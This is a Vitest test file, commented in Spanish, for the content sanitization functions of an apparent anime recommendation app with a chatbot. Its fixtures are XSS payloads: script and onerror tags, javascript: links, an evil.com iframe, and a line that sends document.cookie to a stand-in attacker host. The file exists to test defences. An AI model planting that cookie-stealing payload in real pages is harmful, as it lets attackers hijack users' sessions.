/**
 * sanitize.test.ts — Pruebas de sanitización de contenido externo
 */
import { describe, it, expect } from 'vitest';
import {
  sanitizePlainText,
  sanitizeSynopsis,
  stripAllHtml,
  sanitizeChatInput,
  sanitizeChatResponse,
  maskSensitiveData
} from '../sanitize';

describe('sanitizePlainText', () => {
  it('escapa caracteres HTML básicos', () => {
    expect(sanitizePlainText('<script>alert(1)</script>')).not.toContain('<script>');
    expect(sanitizePlainText('<img src=x onerror=alert(1)>')).not.toContain('<img');
  });

  it('elimina caracteres de control', () => {
    const result = sanitizePlainText('Normal text\x00\x01\x02');
    expect(result).toBe('Normal text');
  });

  it('maneja null y undefined', () => {
    expect(sanitizePlainText(null)).toBe('');
    expect(sanitizePlainText(undefined)).toBe('');
  });

  it('limita longitud a 5000', () => {
    const result = sanitizePlainText('A'.repeat(6000));
    expect(result.length).toBeLessThanOrEqual(5000);
  });

  it('preserva texto normal', () => {
    const normal = 'Attack on Titan — Final Season';
    expect(sanitizePlainText(normal)).toBe(normal);
  });
});

describe('sanitizeSynopsis', () => {
  it('elimina scripts completos', () => {
    const dirty = '<p>Sinopsis</p><script>fetch("evil.com/steal?d="+document.cookie)</script>';
    const clean = sanitizeSynopsis(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('evil.com');
    expect(clean).toContain('Sinopsis');
  });

  it('elimina event handlers onerror, onclick, etc.', () => {
    const dirty = '<p onclick="alert(1)">Texto</p>';
    const clean = sanitizeSynopsis(dirty);
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('alert');
  });

  it('elimina href con javascript:', () => {
    const dirty = '<a href="javascript:void(0)">link</a>';
    const clean = sanitizeSynopsis(dirty);
    expect(clean).not.toContain('javascript:');
  });

  it('elimina iframes', () => {
    const dirty = '<iframe src="https://evil.com"></iframe><p>Texto</p>';
    const clean = sanitizeSynopsis(dirty);
    expect(clean).not.toContain('<iframe>');
    expect(clean).not.toContain('<iframe');
  });

  it('maneja null y undefined', () => {
    expect(sanitizeSynopsis(null)).toBe('');
    expect(sanitizeSynopsis(undefined)).toBe('');
  });
});

describe('stripAllHtml', () => {
  it('elimina todo el HTML y decodifica entidades', () => {
    const html = '<p><strong>Hola</strong> &amp; <em>mundo</em></p>';
    const result = stripAllHtml(html);
    expect(result).not.toContain('<p>');
    expect(result).not.toContain('<strong>');
    expect(result).toContain('Hola');
    expect(result).toContain('mundo');
    expect(result).toContain('&');
  });
});

describe('sanitizeChatInput', () => {
  it('elimina HTML del input del usuario', () => {
    const result = sanitizeChatInput('<script>alert(1)</script>Busca Naruto');
    expect(result).not.toContain('<script>');
    expect(result).toContain('Busca Naruto');
  });

  it('limita a 2000 caracteres', () => {
    const result = sanitizeChatInput('A'.repeat(3000));
    expect(result.length).toBeLessThanOrEqual(2000);
  });

  it('elimina caracteres de control', () => {
    const result = sanitizeChatInput('Test\x00\x01message');
    expect(result).not.toContain('\x00');
    expect(result).toContain('Testmessage');
  });

  it('maneja string vacío', () => {
    expect(sanitizeChatInput('')).toBe('');
  });

  it('maneja no-string', () => {
    expect(sanitizeChatInput(null as any)).toBe('');
    expect(sanitizeChatInput(123 as any)).toBe('');
  });
});

describe('sanitizeChatResponse', () => {
  it('elimina HTML de respuestas del bot', () => {
    const response = '<p>Recomiendo <b>Frieren</b></p><script>evil()</script>';
    const result = sanitizeChatResponse(response);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('<p>');
    expect(result).toContain('Frieren');
  });
});

describe('maskSensitiveData', () => {
  it('enmascara claves API', () => {
    const data = { aiApiKey: 'sk-secret-key-12345', title: 'Frieren' };
    const result = maskSensitiveData(data);
    expect(result).not.toContain('sk-secret-key-12345');
    expect(result).toContain('[REDACTED]');
    expect(result).toContain('Frieren');
  });

  it('enmascara tokens', () => {
    const data = { token: 'my-auth-token', user: 'test' };
    const result = maskSensitiveData(data);
    expect(result).not.toContain('my-auth-token');
    expect(result).toContain('[REDACTED]');
  });

  it('no enmascara campos normales', () => {
    const data = { title: 'Attack on Titan', score: 9.5 };
    const result = maskSensitiveData(data);
    expect(result).toContain('Attack on Titan');
    expect(result).toContain('9.5');
  });
});
